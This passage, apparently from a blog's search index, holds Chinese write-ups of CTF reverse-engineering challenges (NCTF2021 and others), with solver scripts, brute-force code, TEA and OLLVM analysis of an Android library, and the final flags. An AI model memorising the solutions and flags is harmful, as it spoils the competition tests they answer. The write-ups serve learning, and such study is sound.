8)) | ((v6[j] &amp; flag[i + 4]) &lt;&lt; (8 - (4 - j) % 8)) | ((v6[j] &amp; flag[i + 4]) &gt;&gt; ((4 - j) % 8)) | v5 s.add(index == indexs[i+j])assert s.check() == satm = s.model()flag = [chr(m[i].as_long()) for i in flag]print(&quot;DASCTF&#123;&quot; + &quot;&quot;.join(flag) + &quot;&#125;&quot;)# DASCTF&#123;Q5la5_3KChtem6_HYHk_NlHhNZz73aCZeK05II96&#125; 虚假的粉丝IDA打开程序分析 \\ 输入3个数字 文件序号 读取此文件的偏移 从偏移处读多少个字节 然后下面判断读取的数据Buffer[0] != &#39;U&#39; || Buffer[39] != &#39;S&#39; 写脚本判断哪个文件含有这2个字母 12345678for i in range(1, 5317): filename = &quot;f/ASCII-faded &quot; + str(i).zfill(4) + &quot;.txt&quot; f = open(filename, &#x27;r&#x27;, encoding=&quot;utf-8&quot;) c = f.read() if &#x27;U&#x27; in c and &#x27;S&#x27; in c: print(filename) f.close()# f/ASCII-faded 4157.txt 于是打开找到了 UzNDcmU3X0szeSUyMCUzRCUyMEFsNE5fd0FsSzNS 将其base64解密为S3Cre7_K3y%20%3D%20Al4N_wAlK3R URL_decode后为 S3Cre7_K3y = Al4N_wAlK3R 偏移是0x45E(1118), 输入的三个数字是4157, 1118, 40，然后输入 Al4N_wAlK3R 最终/f/ASCII-faded 5315.txt 会被解密，打开即可看到flag flag为 A_TrUe_AW_f4ns 题目附件链接：https://pan.baidu.com/s/1Manwxlun-0gK4ZdkzBU0Zw提取码：sj8s","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"},{"name":"z3","slug":"z3","permalink":"https://zzzzsky.github.io/tags/z3/"}]},{"title":"NCTF2021_RE_WP","slug":"NCTF2021_RE_WP","date":"2021-11-29T06:41:34.000Z","updated":"2021-11-29T11:44:44.992Z","comments":true,"path":"2021/11/29/NCTF2021_RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2021/11/29/NCTF2021_RE_WP/","excerpt":"","text":"NCTF2021_RE_WPHello せかい记事本都能做的题.IDA打开直接看到flag flag为 NCTF&#123;We1come_2_Reverse_Engineering&#125; Shadowbringerbase64换了2次表，调试起来找到表，逆回去即可 写脚本解密 1234567891011121314import base64flag = &quot;U&gt;F2UsQXN`5sXMELT=:7M_2&lt;X]^1ThaWF0=KM?9IUhAsTM5:T==_Ns&amp;&lt;Vhb!&quot;std_table = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;my_table = &#x27;#$%&amp;\\x27()*+,-.s0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[h]^_`ab&#x27;my_table2 = &#x27;ba`_^]h[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210s.-,+*)(\\x27&amp;%$#&#x27;flag = flag.translate(str.maketrans(my_table2, std_table))flag = flag.replace(&quot;!&quot;, &#x27;=&#x27;).encode() # &quot;6G074JP+s)WV:Z+T&lt;&amp;(Q18`Ks)WV:Y4hs9[h:YCS?&amp;0`&quot;flag = base64.b64decode(flag).decode()flag = flag.translate(str.maketrans(my_table, std_table))print(base64.b64decode(flag))# NCTF&#123;H0m3_r1d1n9_h0m3_dy1n9_h0p3&#125; flag 为 NCTF&#123;H0m3_r1d1n9_h0m3_dy1n9_h0p3&#125; 鲨鲨的秘密这个题跟西湖论剑那个第一个RE题好像 loc_404E3B为执行的指令，因为每次就33条汇编，也不长，直接调试把第一轮所有的汇编拿出来分析 12345678910111213141516171819202122232425262728293031323334mov ds:dword_404E50, 0FFFFFFFFh # dword_404E50 = -1mov ecx, ds:Imov dl, [ecx+4049F8h] # flag[0]mov byte ptr ds:dword_404E4C, dl movzx eax, byte ptr ds:dword_404E4Cxor eax, ds:dword_404E50 dword_404E4C = (flag[0] ^ 404E50 ) &amp; 0xFFmov byte ptr ds:dword_404E4C, almovzx ecx, byte ptr ds:dword_404E4Cand ecx, 0FFh dword_404E50 &gt;&gt;= 8mov byte ptr ds:dword_404E4C, clmov edx, ds:dword_404E50 dword_404E50 ^= dword_404A38[dword_404E4C * 4]shr edx, 8mov ds:dword_404E50, edxmovzx eax, byte ptr ds:dword_404E4Cmov ecx, ds:dword_404E50xor ecx, ds:dword_404A38[eax*4]mov ds:dword_404E50, ecxmov edx, ds:Imov al, [edx+4049F9h] # flag[1]mov byte ptr ds:dword_404E4C, almovzx ecx, byte ptr ds:dword_404E4Cxor ecx, ds:dword_404E50 404E4C = flag[1] ^ 404E50mov byte ptr ds:dword_404E4C, clmov edx, ds:dword_404E50 shr edx, 8 dword_404E50 &gt;&gt;= 8mov ds:dword_404E50, edxmovzx eax, byte ptr ds:dword_404E4Cmov ecx, ds:dword_404E50xor ecx, ds:dword_404A38[eax*4] dword_404E50 ^= dword_404A38[dword_404E4C * 4]mov ds:dword_404E50, ecxmov edx, ds:dword_404E50xor edx, 0FFFFFFFFhmov ds:dword_404E50, edx 分析完毕，把程序中加密后的flag提取出来直接爆破 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156#include &lt;stdio.h&gt;#include &lt;windows.h&gt;unsigned char byte_404A38[] =&#123; 0x00, 0x00, 0x00, 0x00, 0x96, 0x30, 0x07, 0x77, 0x2C, 0x61, 0x0E, 0xEE, 0xBA, 0x51, 0x09, 0x99, 0x19, 0xC4, 0x6D, 0x07, 0x8F, 0xF4, 0x6A, 0x70, 0x35, 0xA5, 0x63, 0xE9, 0xA3, 0x95, 0x64, 0x9E, 0x32, 0x88, 0xDB, 0x0E, 0xA4, 0xB8, 0xDC, 0x79, 0x1E, 0xE9, 0xD5, 0xE0, 0x88, 0xD9, 0xD2, 0x97, 0x2B, 0x4C, 0xB6, 0x09, 0xBD, 0x7C, 0xB1, 0x7E, 0x07, 0x2D, 0xB8, 0xE7, 0x91, 0x1D, 0xBF, 0x90, 0x64, 0x10, 0xB7, 0x1D, 0xF2, 0x20, 0xB0, 0x6A, 0x48, 0x71, 0xB9, 0xF3, 0xDE, 0x41, 0xBE, 0x84, 0x7D, 0xD4, 0xDA, 0x1A, 0xEB, 0xE4, 0xDD, 0x6D, 0x51, 0xB5, 0xD4, 0xF4, 0xC7, 0x85, 0xD3, 0x83, 0x56, 0x98, 0x6C, 0x13, 0xC0, 0xA8, 0x6B, 0x64, 0x7A, 0xF9, 0x62, 0xFD, 0xEC, 0xC9, 0x65, 0x8A, 0x4F, 0x5C, 0x01, 0x14, 0xD9, 0x6C, 0x06, 0x63, 0x63, 0x3D, 0x0F, 0xFA, 0xF5, 0x0D, 0x08, 0x8D, 0xC8, 0x20, 0x6E, 0x3B, 0x5E, 0x10, 0x69, 0x4C, 0xE4, 0x41, 0x60, 0xD5, 0x72, 0x71, 0x67, 0xA2, 0xD1, 0xE4, 0x03, 0x3C, 0x47, 0xD4, 0x04, 0x4B, 0xFD, 0x85, 0x0D, 0xD2, 0x6B, 0xB5, 0x0A, 0xA5, 0xFA, 0xA8, 0xB5, 0x35, 0x6C, 0x98, 0xB2, 0x42, 0xD6, 0xC9, 0xBB, 0xDB, 0x40, 0xF9, 0xBC, 0xAC, 0xE3, 0x6C, 0xD8, 0x32, 0x75, 0x5C, 0xDF, 0x45, 0xCF, 0x0D, 0xD6, 0xDC, 0x59, 0x3D, 0xD1, 0xAB, 0xAC, 0x30, 0xD9, 0x26, 0x3A, 0x00, 0xDE, 0x51, 0x80, 0x51, 0xD7, 0xC8, 0x16, 0x61, 0xD0, 0xBF, 0xB5, 0xF4, 0xB4, 0x21, 0x23, 0xC4, 0xB3, 0x56, 0x99, 0x95, 0xBA, 0xCF, 0x0F, 0xA5, 0xBD, 0xB8, 0x9E, 0xB8, 0x02, 0x28, 0x08, 0x88, 0x05, 0x5F, 0xB2, 0xD9, 0x0C, 0xC6, 0x24, 0xE9, 0x0B, 0xB1, 0x87, 0x7C, 0x6F, 0x2F, 0x11, 0x4C, 0x68, 0x58, 0xAB, 0x1D, 0x61, 0xC1, 0x3D, 0x2D, 0x66, 0xB6, 0x90, 0x41, 0xDC, 0x76, 0x06, 0x71, 0xDB, 0x01, 0xBC, 0x20, 0xD2, 0x98, 0x2A, 0x10, 0xD5, 0xEF, 0x89, 0x85, 0xB1, 0x71, 0x1F, 0xB5, 0xB6, 0x06, 0xA5, 0xE4, 0xBF, 0x9F, 0x33, 0xD4, 0xB8, 0xE8, 0xA2, 0xC9, 0x07, 0x78, 0x34, 0xF9, 0x00, 0x0F, 0x8E, 0xA8, 0x09, 0x96, 0x18, 0x98, 0x0E, 0xE1, 0xBB, 0x0D, 0x6A, 0x7F, 0x2D, 0x3D, 0x6D, 0x08, 0x97, 0x6C, 0x64, 0x91, 0x01, 0x5C, 0x63, 0xE6, 0xF4, 0x51, 0x6B, 0x6B, 0x62, 0x61, 0x6C, 0x1C, 0xD8, 0x30, 0x65, 0x85, 0x4E, 0x00, 0x62, 0xF2, 0xED, 0x95, 0x06, 0x6C, 0x7B, 0xA5, 0x01, 0x1B, 0xC1, 0xF4, 0x08, 0x82, 0x57, 0xC4, 0x0F, 0xF5, 0xC6, 0xD9, 0xB0, 0x65, 0x50, 0xE9, 0xB7, 0x12, 0xEA, 0xB8, 0xBE, 0x8B, 0x7C, 0x88, 0xB9, 0xFC, 0xDF, 0x1D, 0xDD, 0x62, 0x49, 0x2D, 0xDA, 0x15, 0xF3, 0x7C, 0xD3, 0x8C, 0x65, 0x4C, 0xD4, 0xFB, 0x58, 0x61, 0xB2, 0x4D, 0xCE, 0x51, 0xB5, 0x3A, 0x74, 0x00, 0xBC, 0xA3, 0xE2, 0x30, 0xBB, 0xD4, 0x41, 0xA5, 0xDF, 0x4A, 0xD7, 0x95, 0xD8, 0x3D, 0x6D, 0xC4, 0xD1, 0xA4, 0xFB, 0xF4, 0xD6, 0xD3, 0x6A, 0xE9, 0x69, 0x43, 0xFC, 0xD9, 0x6E, 0x34, 0x46, 0x88, 0x67, 0xAD, 0xD0, 0xB8, 0x60, 0xDA, 0x73, 0x2D, 0x04, 0x44, 0xE5, 0x1D, 0x03, 0x33, 0x5F, 0x4C, 0x0A, 0xAA, 0xC9, 0x7C, 0x0D, 0xDD, 0x3C, 0x71, 0x05, 0x50, 0xAA, 0x41, 0x02, 0x27, 0x10, 0x10, 0x0B, 0xBE, 0x86, 0x20, 0x0C, 0xC9, 0x25, 0xB5, 0x68, 0x57, 0xB3, 0x85, 0x6F, 0x20, 0x09, 0xD4, 0x66, 0xB9, 0x9F, 0xE4, 0x61, 0xCE, 0x0E, 0xF9, 0xDE, 0x5E, 0x98, 0xC9, 0xD9, 0x29, 0x22, 0x98, 0xD0, 0xB0, 0xB4, 0xA8, 0xD7, 0xC7, 0x17, 0x3D, 0xB3, 0x59, 0x81, 0x0D, 0xB4, 0x2E, 0x3B, 0x5C, 0xBD, 0xB7, 0xAD, 0x6C, 0xBA, 0xC0, 0x20, 0x83, 0xB8, 0xED, 0xB6, 0xB3, 0xBF, 0x9A, 0x0C, 0xE2, 0xB6, 0x03, 0x9A, 0xD2, 0xB1, 0x74, 0x39, 0x47, 0xD5, 0xEA, 0xAF, 0x77, 0xD2, 0x9D, 0x15, 0x26, 0xDB, 0x04, 0x83, 0x16, 0xDC, 0x73, 0x12, 0x0B, 0x63, 0xE3, 0x84, 0x3B, 0x64, 0x94, 0x3E, 0x6A, 0x6D, 0x0D, 0xA8, 0x5A, 0x6A, 0x7A, 0x0B, 0xCF, 0x0E, 0xE4, 0x9D, 0xFF, 0x09, 0x93, 0x27, 0xAE, 0x00, 0x0A, 0xB1, 0x9E, 0x07, 0x7D, 0x44, 0x93, 0x0F, 0xF0, 0xD2, 0xA3, 0x08, 0x87, 0x68, 0xF2, 0x01, 0x1E, 0xFE, 0xC2, 0x06, 0x69, 0x5D, 0x57, 0x62, 0xF7, 0xCB, 0x67, 0x65, 0x80, 0x71, 0x36, 0x6C, 0x19, 0xE7, 0x06, 0x6B, 0x6E, 0x76, 0x1B, 0xD4, 0xFE, 0xE0, 0x2B, 0xD3, 0x89, 0x5A, 0x7A, 0xDA, 0x10, 0xCC, 0x4A, 0xDD, 0x67, 0x6F, 0xDF, 0xB9, 0xF9, 0xF9, 0xEF, 0xBE, 0x8E, 0x43, 0xBE, 0xB7, 0x17, 0xD5, 0x8E, 0xB0, 0x60, 0xE8, 0xA3, 0xD6, 0xD6, 0x7E, 0x93, 0xD1, 0xA1, 0xC4, 0xC2, 0xD8, 0x38, 0x52, 0xF2, 0xDF, 0x4F, 0xF1, 0x67, 0xBB, 0xD1, 0x67, 0x57, 0xBC, 0xA6, 0xDD, 0x06, 0xB5, 0x3F, 0x4B, 0x36, 0xB2, 0x48, 0xDA, 0x2B, 0x0D, 0xD8, 0x4C, 0x1B, 0x0A, 0xAF, 0xF6, 0x4A, 0x03, 0x36, 0x60, 0x7A, 0x04, 0x41, 0xC3, 0xEF, 0x60, 0xDF, 0x55, 0xDF, 0x67, 0xA8, 0xEF, 0x8E, 0x6E, 0x31, 0x79, 0xBE, 0x69, 0x46, 0x8C, 0xB3, 0x61, 0xCB, 0x1A, 0x83, 0x66, 0xBC, 0xA0, 0xD2, 0x6F, 0x25, 0x36, 0xE2, 0x68, 0x52, 0x95, 0x77, 0x0C, 0xCC, 0x03, 0x47, 0x0B, 0xBB, 0xB9, 0x16, 0x02, 0x22, 0x2F, 0x26, 0x05, 0x55, 0xBE, 0x3B, 0xBA, 0xC5, 0x28, 0x0B, 0xBD, 0xB2, 0x92, 0x5A, 0xB4, 0x2B, 0x04, 0x6A, 0xB3, 0x5C, 0xA7, 0xFF, 0xD7, 0xC2, 0x31, 0xCF, 0xD0, 0xB5, 0x8B, 0x9E, 0xD9, 0x2C, 0x1D, 0xAE, 0xDE, 0x5B, 0xB0, 0xC2, 0x64, 0x9B, 0x26, 0xF2, 0x63, 0xEC, 0x9C, 0xA3, 0x6A, 0x75, 0x0A, 0x93, 0x6D, 0x02, 0xA9, 0x06, 0x09, 0x9C, 0x3F, 0x36, 0x0E, 0xEB, 0x85, 0x67, 0x07, 0x72, 0x13, 0x57, 0x00, 0x05, 0x82, 0x4A, 0xBF, 0x95, 0x14, 0x7A, 0xB8, 0xE2, 0xAE, 0x2B, 0xB1, 0x7B, 0x38, 0x1B, 0xB6, 0x0C, 0x9B, 0x8E, 0xD2, 0x92, 0x0D, 0xBE, 0xD5, 0xE5, 0xB7, 0xEF, 0xDC, 0x7C, 0x21, 0xDF, 0xDB, 0x0B, 0xD4, 0xD2, 0xD3, 0x86, 0x42, 0xE2, 0xD4, 0xF1, 0xF8, 0xB3, 0xDD, 0x68, 0x6E, 0x83, 0xDA, 0x1F, 0xCD, 0x16, 0xBE, 0x81, 0x5B, 0x26, 0xB9, 0xF6, 0xE1, 0x77, 0xB0, 0x6F, 0x77, 0x47, 0xB7, 0x18, 0xE6, 0x5A, 0x08, 0x88, 0x70, 0x6A, 0x0F, 0xFF, 0xCA, 0x3B, 0x06, 0x66, 0x5C, 0x0B, 0x01, 0x11, 0xFF, 0x9E, 0x65, 0x8F, 0x69, 0xAE, 0x62, 0xF8, 0xD3, 0xFF, 0x6B, 0x61, 0x45, 0xCF, 0x6C, 0x16, 0x78, 0xE2, 0x0A, 0xA0, 0xEE, 0xD2, 0x0D, 0xD7, 0x54, 0x83, 0x04, 0x4E, 0xC2, 0xB3, 0x03, 0x39, 0x61, 0x26, 0x67, 0xA7, 0xF7, 0x16, 0x60, 0xD0, 0x4D, 0x47, 0x69, 0x49, 0xDB, 0x77, 0x6E, 0x3E, 0x4A, 0x6A, 0xD1, 0xAE, 0xDC, 0x5A, 0xD6, 0xD9, 0x66, 0x0B, 0xDF, 0x40, 0xF0, 0x3B, 0xD8, 0x37, 0x53, 0xAE, 0xBC, 0xA9, 0xC5, 0x9E, 0xBB, 0xDE, 0x7F, 0xCF, 0xB2, 0x47, 0xE9, 0xFF, 0xB5, 0x30, 0x1C, 0xF2, 0xBD, 0xBD, 0x8A, 0xC2, 0xBA, 0xCA, 0x30, 0x93, 0xB3, 0x53, 0xA6, 0xA3, 0xB4, 0x24, 0x05, 0x36, 0xD0, 0xBA, 0x93, 0x06, 0xD7, 0xCD, 0x29, 0x57, 0xDE, 0x54, 0xBF, 0x67, 0xD9, 0x23, 0x2E, 0x7A, 0x66, 0xB3, 0xB8, 0x4A, 0x61, 0xC4, 0x02, 0x1B, 0x68, 0x5D, 0x94, 0x2B, 0x6F, 0x2A, 0x37, 0xBE, 0x0B, 0xB4, 0xA1, 0x8E, 0x0C, 0xC3, 0x1B, 0xDF, 0x05, 0x5A, 0x8D, 0xEF, 0x02, 0x2D&#125;;unsigned char compare[] = &#123; 0x5E, 0x60, 0xF6, 0xC0, 0x0A, 0x6E, 0xB1, 0x00, 0xD2, 0xA2, 0x19, 0x33, 0xB7, 0xB7, 0xCA, 0x57, 0x9C, 0x6D, 0x64, 0x9A, 0x26, 0x27, 0xD8, 0xBD, 0x91, 0xFB, 0x38, 0xD8, 0xB3, 0x0B, 0xE1, 0x8D, 0xAD, 0x0D, 0x6B, 0x17, 0xEF, 0xDE, 0x5F, 0x68, 0xB1, 0xF7, 0x1F, 0x2C, 0x96, 0x42, 0x44, 0x6C, 0x90, 0xFE, 0x5C, 0xA1, 0x21, 0x87, 0xCD, 0x20, 0xE8, 0x7C, 0x96, 0x62, 0xFD, 0x41, 0x16, 0x2C, 0x9A, 0x0F, 0x2D, 0x57, 0x2C, 0xDC, 0x52, 0xAE, 0xCF, 0x7D, 0x49, 0x50, 0x4A, 0xBF, 0x6A, 0xFF&#125;;int main() &#123; DWORD* dword_404A38 = (DWORD*)byte_404A38; DWORD* dwcompare = (DWORD*)compare; char flag[40] = &#123;0&#125;; for (int k = 0; k &lt; 40; k+=2) &#123; for (int i = 32; i &lt; 128; i++) &#123; for (int j = 32; j &lt; 128; j++) &#123; flag[0] = i; flag[1] = j; DWORD dword_404E50 = 0xFFFFFFFF; DWORD dword_404E4C = (flag[0] ^ dword_404E50) &amp; 0xFF; dword_404E50 &gt;&gt;= 8; dword_404E50 ^= dword_404A38[dword_404E4C]; dword_404E4C = (flag[1] ^ dword_404E50) &amp; 0Xff; dword_404E50 &gt;&gt;= 8; dword_404E50 ^= dword_404A38[dword_404E4C]; dword_404E50 = 0xFFFFFFFF - dword_404E50; if (dword_404E50 == dwcompare[k/2]) &#123; printf(&quot;%c%c&quot;, i, j); &#125; &#125; &#125; &#125; return 0;&#125; flag为 NCTF&#123;rLdE57TG0iHA39qUnFZp6LeJyYEBcxMNL7&#125; 狗狗的秘密 前面是47进制，直接用C语言实现上面那个框中的算法，调试，输几个数试试就能试出来了 先写脚本从下往上把47进制后的flag弄出来，发现有很多种情况 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253byte_405018 = [ 0x21, 0x43, 0x65, 0x87, 0x09, 0x21, 0x43, 0x65, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC]byte_405118 = [ 0xA7, 0x1C, 0x7E, 0xAF, 0xD9, 0xC2, 0xC0, 0xBE, 0x1F, 0x45, 0x9A, 0x85, 0x26, 0xE3, 0x87, 0xC3, 0x21, 0xE0, 0x95, 0x10, 0x71, 0x70, 0x02, 0x75, 0x35, 0xA5, 0x1D, 0x0D, 0x2F, 0xEE, 0x25, 0x7B, 0xB5, 0x82, 0x66, 0x8D, 0xDB, 0x53, 0x3A, 0x29, 0xD4, 0x43, 0x99, 0x97, 0x9D, 0xE8, 0x49, 0x00]byte_v17 = [0x52, 0xC3, 0x1A, 0xE0, 0x16, 0x5D, 0x5E, 0xE2, 0x67, 0x1F, 0x1F, 0x06, 0x06, 0x1F, 0x17, 0x06, 0x0F, 0xF9, 0x06, 0x67, 0x58, 0xB2, 0xE2, 0x8C, 0x0F, 0x2A, 0x06, 0x89, 0xCF, 0x2A, 0x06, 0x1F, 0x98, 0x1A, 0x3E, 0x17, 0x67, 0x1F, 0xF7, 0x3A, 0x44, 0xC3, 0x16, 0x33, 0x69, 0x1A, 0x75, 0x16, 0x3E, 0x17, 0xD5, 0x69, 0x7A, 0x1B, 0x44, 0x44, 0x3E, 0x67, 0xF7, 0x89, 0x67]v11 = []for v17 in byte_v17: for i in range(256): c = byte_405018[i] ^ i if c == v17: # print(hex(i)) if i in byte_405118: print(byte_405118.index(i), end=&quot; &quot;) print(&quot;&quot;) 索引为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960612 0 33 45 44 30 40 8 2322 11 737 3437 3419 20 4319 20 4337 342419 20 4331 42919 20 4322 11 7135234131 43519 20 439143519 20 4337 34333 45102422 11 737 343812503064233 45363010242142262825251022 11 738922 11 7 然后写脚本，从一头开始试，因为如果一头稍微一改，打印的字符串前面变化很大的话，说明改对了，因为数据高位一改，整个数字变化才大，然后long_to_bytes后对应的字符也变换很大了，如果从低位改，数据变化不大，long_to_bytes后头部的字符变化也不大了， 就这样一点点改，flag就一点点的显示出来了 可能描述的有点抽象，举个例子就很容易懂了 对应的解密脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from Crypto.Util.number import *compare = [2, 0, 45, 44, 30, 40, 8, 23, 11, 37, 34, 43, 43, 37, 24, 19, 4, 29, 19, # 19 20 43 22, # 22 11 7 13, 5, 23, 41, 4, # 31 4 35, 20, # 19 20 43 9, 14, 35, 43, # 19 20 43 37, # 37 34 3, 33, # 33 45 10, 24, 22, # 22 11 7 37, # 37 34 38, 1, 25, 0, 30, 6, 42, 45, # 33 45 36, 30, 10, 24, 21, 42, 26, 28, 25, 25, 10, 7, 38, 9, 11]sum = 0re_compare = compare[::-1]for i in range(len(compare)): tmp = re_compare[i] * pow(47, i) sum += tmpprint(long_to_bytes(sum))# NCTF&#123;ADF0E239-D911-3781-7E40-A575A19E5835&#125; flag为 NCTF&#123;ADF0E239-D911-3781-7E40-A575A19E5835&#125; easy_mobileJEB打开分析 发现check_flag 的算法在对应的so文件里 IDA打开找到 Java_com_example_rectf_MainActivity_checkflag 函数 哇塞，看这优美的图形，是OLLVM，从网上找来各种脚本平坦化，要么是失败，要么是去了还不如不去容易看 我一共试了这2个脚本 https://github.com/cq674350529/deflat （成功去除，基址设置为0X400000，比如check_flag是0X7900，然后 就运行 python deflat.py -f libnative-lib.so --addr 0x407900，但是去了后我感觉更难看了） https://github.com/pcy190/deobfuscator （这个我去除失败，可能是qiling版本的问题） 好吧，直接硬刚OLLVM，真机调试 如何搭建真机调试环境可以参考我写的这篇文章 https://zzzzsky.com/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/ 在下面每个框中第一条指令下断点，尤其是这种大的块肯定是有用的，先审视一下这种大的块 发现在这个位置调用了strlen，然后与0X18对比 猜测是验证flag的长度，继续审视其他块 在这个位置发现了一些类似密钥的字符串，还调用了一个函数，进入这个 sub_7D30F1E260 函数 根据&lt;&lt; 4 &gt;&gt;5 0X12345678等特征，发现这是一种个TEA算法，delta改为了0X12345678 继续审视，在这个位置发现了一些明文 F5，发现这里还有一些加减乘除的一些操作 开始调试，直接在上面对应的位置下断点，flag先输入12345试试，一点点来到strlen的位置，发现果然是验证flag的长度 继续F9，发现即没有到达加减乘除那个块，也没有到达TEA算法那里就显示NO了，我么输入flag为 123456789012345678901234 好，程序断在了加减乘除那个块那里，直接一点点单步调试 在mul之前停下，观察寄存器，发现X1指向的是最后8个字符，然后来到X16寄存器指向的内存位置，稍微整理整理 发现系统初始化了16个字符 PRST0123789: &quot;#$ ，然后下面紧跟着flag 的前16位，猜测flag是分开验证的16 + 8 跳过乘法，再看内存 最终调试到memcpy的位置 dword_7CD3B3E14C 处的数据为 而刚才0007FD020C630处的数据已经变为了 于是猜测是flag的前16位根据PRST0123789: &quot;#$ 加减乘除后 与dword_7CD3B3E14C进行对比，然后flag 的后8位是那个tea算法 这里一点点调试，发现 1234[&#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1687, 1824, 1912, 2002][&#x27;9&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;] * [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;] + [&#x27;P&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;] = [2816, 2434, 2533, 2634][&#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1751, 1892, 1982, 2074][&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;] * [&#x27; &#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;] + [&#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;] = [1623, 1756, 1842, 1930] 写脚本解密得到flag的前16个字符 12345678910111213141516171819202122232425262728293031323334a = [3287, 1688, 3452, 1786, 3255, 1994, 1947, 2002, 2384, 2777, 2783, 5286, 3319, 1824, 1842, 2038] mul1 = [ord(i) for i in &quot;0123&quot;]mul2 = [ord(i) for i in &#x27; &quot;#$&#x27;]add1 = [ord(i) for i in &quot;PRST&quot;]add2 = [ord(i) for i in &quot;789:&quot;]flag = []flag1 = [(a[:4][i]-add2[i])/mul2[i] for i in range(4)]flag2 = [(a[4:8][i]-add2[i])/mul2[i] for i in range(4)]flag3 = [(a[8:12][i]-add1[i])/mul1[i] for i in range(4)]flag4 = [(a[12:][i]-add2[i])/mul2[i] for i in range(4)]print(flag1)print(flag2)print(flag3)print(flag4)flag = flag1 + flag2 + flag3 + flag4flag = [chr(int(i)) for i in flag]print(&quot;&quot;.join(flag))# [101.0, 48.0, 97.0, 48.0]# [100.0, 57.0, 54.0, 54.0]# [48.0, 55.0, 54.0, 102.0]# [102.0, 52.0, 51.0, 55.0]# e0a0d966076ff437 然后flag输入e0a0d966076ff437ABCD1234重新调试，果然程序断在了TEA算法的位置 发现果然是对flag的后8个字符进行TEA加密，直接运行到加密完成 然后进入汇编界面单步调试，注意CMP指令 可以发现V0加密后应改为0XC65AEDA, 这里修改X13的值为0XC65AEDA,使其验证通过，然后再单步 运行到这个位置，发现V1加密后的数据为 0xADBF8DB1 直接写脚本解密 